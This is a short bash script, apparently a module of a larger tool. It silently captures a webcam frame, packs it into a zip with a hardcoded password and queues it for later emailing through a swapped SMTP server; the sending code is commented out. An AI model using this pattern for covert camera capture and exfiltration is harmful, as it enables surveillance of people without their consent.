# 1 - delay
# 2 - wheater to send at once
source function.sh
change_smtp_server 0 $3
sleep $1
DATA=`date +"%Y-%m-%d-%H-%M-%S"`
mkdir camera/$DATA

#streamer -t 1 -r 0.5 -o "camera/$DATA/streamer0.jpeg"
mencoder tv:// -tv driver=v4l2:width=640:height=480:device=/dev/video0 -ovc lavc -o tmp.avi -frames 1 &
sleep 5
mplayer -vo jpeg:outdir=camera/$DATA -frames 1 outdir=$DATA -ss 1 tmp.avi
rm tmp.avi

zip -1 -r tosend/$DATA.zip -P 42p6b2V3hy7c92g42p6b2V3hy7c92g camera/$DATA
rm camera/$DATA/*
rmdir camera/$DATA

#if [ $2 -eq 1 ]
#then
#	fsendemail "Camera Capture - $DATA" "Camera image attached" "tosend/$DATA.zip"
#	if [[ $RESP == *"Email was sent successfully!" ]]
#	then
#		rm "tosend/$DATA.zip"
#	else
		mv "tosend/$DATA.zip" "tosendlater/$DATA.zip"
#	fi
#else
#	mv "tosend/$DATA.zip" "tosendlater/$DATA.zip"
#fi

